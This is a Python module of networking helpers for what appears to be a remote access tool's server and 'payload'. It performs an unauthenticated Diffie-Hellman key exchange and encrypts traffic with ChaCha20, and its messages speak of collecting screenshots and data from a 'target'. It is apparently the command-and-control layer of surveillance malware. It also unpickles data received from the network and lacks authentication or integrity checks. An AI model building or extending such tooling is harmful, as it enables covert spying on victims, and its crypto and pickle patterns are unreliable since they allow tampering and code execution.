"""Networking helpers used by the server and payload."""

from Crypto.Util.number import getPrime, getRandomNBitInteger
from Crypto.Protocol.KDF import HKDF
from Crypto.Hash import SHA256
from Crypto.Cipher import ChaCha20
from Crypto.Random import get_random_bytes
import pickle
import socket
import time
from termcolor import colored
from components.logging import log_activity

# Key Exchange and Encryption

def start_diffie_hellman_exchange(conn_obj: socket.socket, bits: int = 2048):
    """Perform a Diffie-Hellman key exchange and return a symmetric key."""

    # Generate prime ``p`` and base ``g``
    p = getPrime(bits)
    g = 2

    # Generate server's private and public key
    private_key = getRandomNBitInteger(bits)
    public_key = pow(g, private_key, p)

    # Send p, g, and server's public key to client
    conn_obj.sendall(str(p).encode() + b'\n')
    conn_obj.sendall(str(g).encode() + b'\n')
    conn_obj.sendall(str(public_key).encode() + b'\n')

    # Receive client's public key
    client_public_key = int(conn_obj.recv(4096).decode().strip())

    # Compute the shared secret
    shared_secret = pow(client_public_key, private_key, p)

    # Derive a symmetric key from the shared secret
    symmetric_key = HKDF(shared_secret.to_bytes((shared_secret.bit_length() + 7) // 8, 'big'), 32, b'', SHA256)

    return symmetric_key

def attempt_exchange(conn_obj: socket.socket):
    """Retry the key exchange up to three times."""

    attempts = 0
    while attempts < 3:
        try:
            symmetric_key = start_diffie_hellman_exchange(conn_obj, 2048)
            return symmetric_key 
        except Exception as e:
            print(colored(f"[-] Unable to establish cryptographic keys, re-attempting . . . ({attempts+1}/3)", "red"))
            log_activity(f"Unable to establish cryptographic keys due to {e}, attempt ({attempts+1}/3)", "error")
            attempts += 1
            time.sleep(2)  # Wait for 2 seconds before retrying
            if attempts == 3:
                conn_obj.close()
                break

    print(colored("\n[-] Failed to establish a secure connection after several attempts. Try reconnecting with target!", "red"))
    return None  # Return None if all attempts fail  

def encrypt_message(plaintext) -> bytes:
    """Encrypt ``plaintext`` using the global symmetric key."""

    global symmetric_key
    if isinstance(plaintext, str):
        try:
            plaintext = plaintext.encode()
        except BytesWarning:
            plaintext = plaintext.encode('utf-8')
    else:
        plaintext = pickle.dumps(plaintext)

    # Generate a unique 12-byte nonce for each encryption
    nonce = get_random_bytes(12)
    cipher = ChaCha20.new(key=symmetric_key, nonce=nonce)
    encrypted_message = cipher.encrypt(plaintext)
    return nonce + encrypted_message 

def decrypt_message(encrypted_message: bytes):
    """Decrypt ``encrypted_message`` using the global symmetric key."""

    global symmetric_key
    
    # Check if the encrypted message has the minimum length for a nonce
    if len(encrypted_message) < 12:
        print(colored("[-] Content received is too short to decrypt, skipping data. Try again with the same command", "red"))
        log_activity("Data received from target contains too little information to be decrypted, data is skipped.", "error")
        return None
    
    nonce = encrypted_message[:12]
    ciphertext = encrypted_message[12:]
    
    try:
        cipher = ChaCha20.new(key=symmetric_key, nonce=nonce)
        decrypted_data = cipher.decrypt(ciphertext)
        # Check if the decrypted data is pickle data (usually for complex data types)
        try:
            return pickle.loads(decrypted_data)
        except pickle.UnpicklingError:
            # Return raw bytes if it's not pickle data
            return decrypted_data
    except Exception as e:
        print(f"[-] An unknown exception occurred: {e}, skipping data. Try again with the same command")
        log_activity(f"An unknown error has occurred in the decryption function: {e}.", "error")
        return None

# Data Handling

def reliable_recieve(conn_obj: socket.socket, data_size: int):
    """Receive exactly ``data_size`` bytes from ``conn_obj``."""

    log_activity(
        f"Connection timeout changed to suit {data_size} bytes of data.", "info"
    )
    conn_obj.settimeout(max(10, data_size / (1024 * 1024)))  # Set dynamic timeout based on size
    
    received_data = b''
    print("[!] Collecting data from target, processing time depends on item size")
    while len(received_data) < data_size:
        packet = conn_obj.recv(min(4096, data_size - len(received_data)))  # Receive in chunks
        if not packet:
            log_activity("Connection closed or data ended unexpectedly when receiving screenshot data. Try again in a little moment.", "error")
            return None
        received_data += packet

    return received_data

def process_and_check_recieved_data(received_data: bytes, data_size):
    """Validate data length and decrypt the payload."""

    if isinstance(data_size, str):
        log_activity(
            f"Supposed to recieve the data size but got type 'str' instead, output : {data_size}",
            "error",
        )
        return f"[-] Error when getting file data {data_size}. Please try again."
    
    # Check data integrity
    if len(received_data) != data_size:
        log_activity(f"Received data size ({len(received_data)}) does not match the expected size ({data_size}).", "error")
        return "Received data size does not match the expected size."
    
    # If all data is received properly, process it
    decrypted_data = decrypt_message(received_data)
    if decrypted_data is None:
        log_activity("Failed to decrypt screenshot or else data is corrupted. Try again in a little moment.", "error")
        return "Data is corrupted or else is in an invalid format"
    
    return decrypted_data

def clear_socket_buffer(conn_obj: socket.socket):
    """Drain any remaining data from the socket buffer."""

    original_timeout = conn_obj.gettimeout()
    conn_obj.settimeout(0.20)
    
    try:
        while True:
            if conn_obj.recv(4096) == b'':
                break
    except socket.timeout:
        pass
    finally:
        conn_obj.settimeout(original_timeout)
